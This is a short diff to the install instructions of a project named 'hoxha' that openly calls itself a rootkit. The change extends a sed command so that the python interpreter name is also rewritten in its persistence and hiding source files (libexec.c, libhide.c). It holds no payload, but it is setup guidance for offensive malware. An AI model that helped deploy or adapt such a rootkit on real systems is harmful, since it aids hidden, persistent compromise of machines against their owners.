@@ -11,7 +11,7 @@ git clone https://github.com/mephistolist/hoxha.git
 ```
 If you are not on a Debian based system, you will want to run this to change to the name of your python install:
 ```
-sed -i 's/python3/python/g' hoxha/persistance/libexec.c 
+sed -i 's/python3/python/g' hoxha/persistance/libexec.c; sed -i 's/python3/python/g' hoxha/persistance/libhide.c  
 ```
 Considering SCTP is installed and loaded in the kernel, you can install the rootkit this:
 ```
